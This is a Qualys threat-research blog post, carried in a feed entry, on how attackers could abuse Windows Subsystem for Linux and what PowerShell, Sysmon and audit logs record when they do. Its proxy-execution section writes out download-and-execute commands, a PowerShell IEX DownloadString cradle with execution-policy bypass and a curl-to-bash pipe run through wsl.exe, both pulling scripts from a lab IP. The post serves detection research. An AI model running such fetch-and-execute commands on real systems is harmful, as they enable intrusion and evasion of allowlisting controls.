      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1#respond</comments>
      <dc:creator><![CDATA[Akshat Pradhan]]></dc:creator>
      <pubDate>Tue, 22 Mar 2022 14:25:16 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29676</guid>
      <description><![CDATA[This post is the first of a multi-part blog series that will explore and highlight the different risks that Windows Subsystem for Linux (WSL) poses to an enterprise IT environment. Here we examine a new Microsoft feature for GNU\Linux that increases the attack surface and introduces a lot more complexity to detection. Go to Part [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>This post is the first of a multi-part blog series that will explore and highlight the different risks that Windows Subsystem for Linux (WSL) poses to an enterprise IT environment. Here we examine a new Microsoft feature for GNU\Linux that increases the attack surface and introduces a lot more complexity to detection.</em></p>



<p class="has-text-align-right"><strong><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2">Go to Part 2 →</a></strong></p>



<h3 id="toc1">About Windows Subsystem for Linux</h3>



<p>Windows Subsystem for Linux (WSL) is a feature that allows Linux binaries to run on Windows without modification. WSL allows users to invoke processes in Linux from Windows and vice versa, access files across both the operating systems, share environment variables, and mix different commands together.</p>



<p>WSL has had two version releases with <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions#whats-new-in-wsl-2">major architectural differences</a>:</p>



<ul><li>WSL1 uses a translation layer that implements Linux syscalls on top of the windows kernel. WSL1 achieves this via PICO processes and providers (lxss.sys and lxcore.sys). PICO processes are minimalistic and rely on a kernel mode driver to manage. <a href="https://docs.microsoft.com/en-in/archive/blogs/wsl/pico-process-overview">Microsoft’s WSL Blog</a> has published further details on the implications, motivations, and history of PICO processes.</li><li>WSL2 on the other hand uses a Virtual Machine to run the <a href="https://github.com/microsoft/WSL2-Linux-Kernel">Linux kernel source code</a> with the VM growing and shrinking dynamically based on usage.</li></ul>



<p>WSL is still in its early days and Microsoft is actively developing it and introducing additional features. Recent updates have <a href="https://docs.microsoft.com/en-us/windows/wsl/tutorials/gui-apps">added GUI support</a> for a fully integrated desktop experience.</p>



<p>The main goal of WSL is to allow users to use their favourite Linux tools while on Windows. The Qualys Research Team decided to shed some light on probable WSL abuse in the lifecycle of an attack.</p>



<h3 id="toc2">Our Test Environment Design</h3>



<p>Here’s how we set up our test environment. We used two Windows 10 virtual machines (version 20H2, build 19042) with one running WSL1 and the other WSL2. While you could run WSL1 and WSL2 together on the same machine, we separated them out for clarity in our logs. Our logging capability was PowerShell script block logs, <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing">command line process auditing</a>, and System Monitor (Sysmon). Windows Defender Real Time Protection would mostly be left turned on, unless it blocked any tests.</p>



<h3 id="toc3">How an Attacker Enables Windows Subsystem for Linux</h3>



<p>Before we jump into actual threats, we should first understand how feasible WSL is as an attack vector. We will evaluate this based on how difficult it is for an attacker to install and or enable WSL. This will also help us determine at where in the attacker lifecycle will the techniques that abuse this threat fall.</p>



<span id="more-29676"></span>



<p>Adversaries need elevated access to enable and install WSL. For WSL1 this can be achieved with the below command followed by a prompted reboot (see fig. 1):</p>



<pre class="wp-block-preformatted q-code-highlighted">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</pre>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29688" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig1-9" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig1.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig1-300x169.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig1-1070x602.png" loading="lazy" width="1920" height="1080" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig1.png" alt="" class="wp-image-29688" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig1.png 1920w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig1-300x169.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig1-1070x602.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig1-768x432.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig1-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><figcaption>Fig.1 WSL1 Installation</figcaption></figure>



<p>The adversary can then either import a distribution or install it from the Microsoft store. We will discuss this more a bit later. For now, we will install Ubuntu via the command:</p>



<pre class="wp-block-preformatted q-code-highlighted">wsl.exe –install -d Ubuntu</pre>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29689" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig2-9" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig2.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig2" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig2-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig2-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig2.png" alt="" class="wp-image-29689" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig2.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig2-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig2-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig2-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.2 WSL1 Ubuntu installation and ls.</figcaption></figure>



<p>In a new window, we are prompted to set up a Linux user by entering a username and password. However, this is not explicitly required as seen in figure 2, so we can terminate that process and continue using the default root.</p>



<p>Since WSL2 uses virtualisation, adversaries need to first enable it via an elevated command:</p>



<pre class="wp-block-preformatted q-code-highlighted">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</pre>



<p>As shown in figure 3, WSL2 can then be enabled via:</p>



<pre class="wp-block-preformatted q-code-highlighted">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</pre>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29691" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig3-8" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig3.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig3" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig3-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig3-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig3.png" alt="" class="wp-image-29691" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig3.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig3-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig3-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig3-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.3 WSL2 Enabling WSL and Virtualisation</figcaption></figure>



<p>WSL can now be installed along with the default distribution (in this case, Ubuntu) via the command:</p>



<pre class="wp-block-preformatted q-code-highlighted">wsl.exe –install</pre>



<p>The output of the command is shown in figure 4. It&#8217;s important to know that a reboot is required for WSL usage.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29692" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig4-5" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig4.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig4" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig4-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig4-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig4.png" alt="" class="wp-image-29692" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig4.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig4-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig4-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig4-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.4 WSL2 Installation</figcaption></figure>



<p>Note: Some Virtual Machine utilities require you to enable additional settings to use virtualisation in the VM.</p>



<p>Based on the above information we can infer that enabling and installing WSL requires an adversary to already have a strong foothold on the victim machine. Therefore, these techniques fall into a post compromise scenario where the attacker either wants stealth or needs to introduce additional tools to expand access. But if WSL is already used in the victim environment, then these techniques would be employed during the initial phases of an attack.</p>



<p>Adversaries can check the WSL version and the distribution installed via the following command (fig. 5):</p>



<pre class="wp-block-preformatted q-code-highlighted">wsl.exe –list –verbose</pre>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29693" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig5-4" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig5.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig5" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig5-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig5-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig5.png" alt="" class="wp-image-29693" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig5.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig5-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig5-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig5-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.5 Listing installed distributions</figcaption></figure>



<p>In the next section we will look at a TTP involving WSL.</p>



<h3 id="toc4">Attack Tactics, Techniques &amp; Procedures Using Windows Subsystem for Linux</h3>



<p>This blog series examines several tactics, techniques and procedures (TTPs) that an attacker might employ leveraging Windows Subsystem for Linux. Here’s the first one, proxying execution.</p>



<h4>TTP #1: Proxying Execution</h4>



<p>WSL allows users several methods for interoperability with the host machine and vice versa:</p>



<ul><li>The Linux filesystem can be accessed in Windows via the UNC path <code>\\wsl$\&lt;distroname&gt;</code></li><li>From Linux, the Windows filesystem can be accessed via <code>/mnt/c/</code></li><li>Linux commands from Windows can be called by passing the command as an argument to wsl.exe or to bash.exe</li><li>Windows processes can be called from Linux by using the binaries full path (/mnt/c…)</li><li>Alternately, if the binary is in the PATH environment variable, it can be directly referenced</li><li>Piping and redirection are also possible</li></ul>



<p>Let’s see the data our testbed can collect with the help of some examples.</p>



<p>The first scenario we will examine is a simple PowerShell download and execution of the cmdlet Get-Date.</p>



<pre class="wp-block-preformatted q-code-highlighted">wsl powershell.exe "powershell -ep Bypass IEX((New-object System.net.Webclient).DownloadString('http://192.168.0.142:8000/date.txt'))"</pre>



<p>Another variant of the above command uses the wsl -e / &#8211;exec flag (figure 6).</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29694" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig6-4" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig6.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig6" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig6-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig6-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig6.png" alt="" class="wp-image-29694" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig6.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig6-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig6-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig6-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.6 Sample output of script.</figcaption></figure>



<p>We see similar events captured for WSL1 and 2, whether the logs are Powershell (fig. 7), Sysmon (fig. 8), or captured by security audits (fig. 9).</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29695" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig7-5" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig7.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig7" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig7-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig7-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig7.png" alt="" class="wp-image-29695" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig7.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig7-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig7-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig7-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.7 Powershell logs for WSL2</figcaption></figure>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29696" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig8-4" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig8.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig8" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig8-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig8-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig8.png" alt="" class="wp-image-29696" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig8.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig8-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig8-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig8-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.8 Sysmon logs for WSL2</figcaption></figure>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29697" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig9-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig9.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig9" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig9-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig9-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig9.png" alt="" class="wp-image-29697" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig9.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig9-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig9-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig9-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.9 Audit logs for WSL2</figcaption></figure>



<p>The events collected show expected behaviour. However, WSL and bash are catalogue signed and thus can be used to bypass AWL or digital signature checks, as <a href="https://attack.mitre.org/techniques/T1218/">described by MITRE</a>. Both wsl.exe and bash.exe have been identified as LOLBINS by <a href="https://lolbas-project.github.io/">the LOLBAS Project</a>.</p>



<p>Now we will perform the same scenario via Linux commands. Here we are downloading the Linux shell command date and passing it to bash.</p>



<pre class="wp-block-preformatted q-code-highlighted">wsl.exe curl -s "http://192.168.0.142:8000/date2.txt" | bash</pre>



<p>In figure 10, we see the following events captured for WSL2.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29699" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig10-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig10.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig10" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig10-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig10-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig10.png" alt="" class="wp-image-29699" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig10.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig10-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig10-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig10-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.10 WSL2 audit logs for Linux commands</figcaption></figure>



<p>One interesting point to note is that the piped bash is missing. In fact, the only event that was logged was concerning bash process creation that had missing command line arguments (fig. 11).</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img data-attachment-id="29700" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig11-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig11.png" data-orig-size="754,532" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig11" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig11-300x212.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig11.png" loading="lazy" width="754" height="532" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig11.png" alt="" class="wp-image-29700" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig11.png 754w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig11-300x212.png 300w" sizes="(max-width: 754px) 100vw, 754px" /><figcaption>Fig.11 WSL2 Audit logs for Linux commands</figcaption></figure></div>



<p>For Sysmon, we get the following details (fig. 12). Note that the command line for bash is bash.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29701" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig12-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig12.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig12" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig12-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig12-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig12.png" alt="" class="wp-image-29701" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig12.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig12-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig12-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig12-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.12 WSL2 Sysmon logs for download.</figcaption></figure>



